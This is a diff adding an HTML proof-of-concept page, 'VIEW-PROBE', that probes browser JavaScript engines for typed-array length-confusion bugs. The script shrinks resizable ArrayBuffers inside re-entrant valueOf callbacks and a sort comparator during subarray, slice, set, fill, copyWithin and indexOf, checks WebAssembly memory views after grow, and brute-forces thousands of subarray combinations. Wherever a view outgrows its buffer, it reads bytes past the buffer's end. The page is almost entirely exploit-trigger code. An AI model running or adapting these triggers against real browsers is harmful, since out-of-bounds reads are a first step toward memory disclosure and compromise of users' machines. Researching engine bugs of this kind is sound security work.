@@ -1,0 +1,70 @@
+<!doctype html>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VIEW-PROBE</title>
+<body style="background:#000;color:#0f0;font:14px monospace;white-space:pre-wrap;margin:10px">
+<div id=o>[VIEW-PROBE] view-shaping API length confusion</div>
+<script>
+const o=document.getElementById('o');
+const log=m=>o.textContent+="\n"+m;
+window.addEventListener('error',e=>log("[ERROR] "+e.message));
+log("[*] start");
+
+function check(tag,v,ab){
+  try{
+    const bl=v.byteLength, abl=ab.byteLength;
+    const confused=bl>abl;
+    log(tag+": v.bytes="+bl+" ab="+abl+(confused?" *** CONFUSED ***":""));
+    if(confused){
+      try{ const u=new Uint8Array(v.buffer||v); let nz=0; for(let i=abl;i<Math.min(bl,abl+4096);i++) if(u[i]!==0) nz++; log(tag+" nonzero-past-end="+nz); }catch(e){log(tag+" read: "+e.name);}
+      try{ structuredClone(v); log(tag+" serialize SURVIVED"); }catch(e){ log(tag+" serialize: "+e.name); }
+    }
+  }catch(e){log(tag+": "+e.name);}
+}
+
+(async()=>{
+// V1: subarray with re-entrant begin/end
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Float64Array(ab);const s=v.subarray({valueOf(){ab.resize(16);return 0;}},{valueOf(){return 0x10000000;}});check("V1 subarray",s,ab);}catch(e){log("V1: "+e.name);}
+
+// V2: typed array .slice() with re-entrant args
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Float64Array(ab);const s=v.slice({valueOf(){ab.resize(16);return 0;}},{valueOf(){return 0x10000000;}});check("V2 tslice",s,ab);}catch(e){log("V2: "+e.name);}
+
+// V3: .set(source, offset) where offset coerces and shrinks target
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Uint8Array(ab);v.set([1,2,3,4],{valueOf(){ab.resize(2);return 0;}});check("V3 set",v,ab);}catch(e){log("V3: "+e.name);}
+
+// V4: copyWithin with re-entrant target/start
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Uint8Array(ab);v.copyWithin({valueOf(){ab.resize(16);return 0;}},0x800,{valueOf(){return 0x1000;}});check("V4 copyWithin",v,ab);}catch(e){log("V4: "+e.name);}
+
+// V5: fill with re-entrant start/end
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Uint8Array(ab);v.fill(0x42,{valueOf(){ab.resize(16);return 0;}},{valueOf(){return 0x800;}});check("V5 fill",v,ab);}catch(e){log("V5: "+e.name);}
+
+// V6: sort with comparator that shrinks
+try{const ab=new ArrayBuffer(0x100,{maxByteLength:0x1000});const v=new Float64Array(ab);let done=0;v.sort(()=>{if(!done){done=1;try{ab.resize(8);}catch(_){}}return 0;});check("V6 sort",v,ab);}catch(e){log("V6: "+e.name);}
+
+// V7: indexOf with re-entrant fromIndex
+try{const ab=new ArrayBuffer(0x1000,{maxByteLength:0x10000});const v=new Uint8Array(ab);const r=v.indexOf(0x99,{valueOf(){ab.resize(16);return 0;}});log("V7 indexOf r="+r);}catch(e){log("V7: "+e.name);}
+
+// V8: WASM memory view captured before grow (bug 2 interplay)
+try{
+  const mem=new WebAssembly.Memory({initial:1,maximum:4});
+  const v=new Float64Array(mem.buffer);
+  mem.grow(1);
+  check("V8 wasm view after grow",v,mem.buffer);
+  log("V8: mem.buffer detached? "+(v.buffer.byteLength===0?"yes":"no")+" v.len="+v.length);
+}catch(e){log("V8: "+e.name);}
+
+// V9: brute force subarray/slice phase combos
+let hits=0;
+for(let i=0;i<20000;i++){
+  const sz=64+(i%512);
+  const ab=new ArrayBuffer(sz,{maxByteLength:0x100000});
+  try{
+    const v=new Uint32Array(ab);
+    const s=v.subarray({valueOf(){try{ab.resize(sz>>2);}catch(_){}return 0;}},{valueOf(){return 0x20000000-1;}});
+    if(s.length>0 && (s.byteOffset+s.byteLength)>ab.byteLength){hits++;if(hits<6)log("V9 i="+i+" s.len="+s.length+" s.bytes="+s.byteLength+" ab="+ab.byteLength+" *** CONFUSED ***");}
+  }catch(_){}
+  if((i&0x3FF)===0&&i>0){log("V9 i="+i+" hits="+hits);await new Promise(r=>setTimeout(r,0));}
+}
+log("V9 done hits="+hits);
+log("DONE");
+})();
+</script>
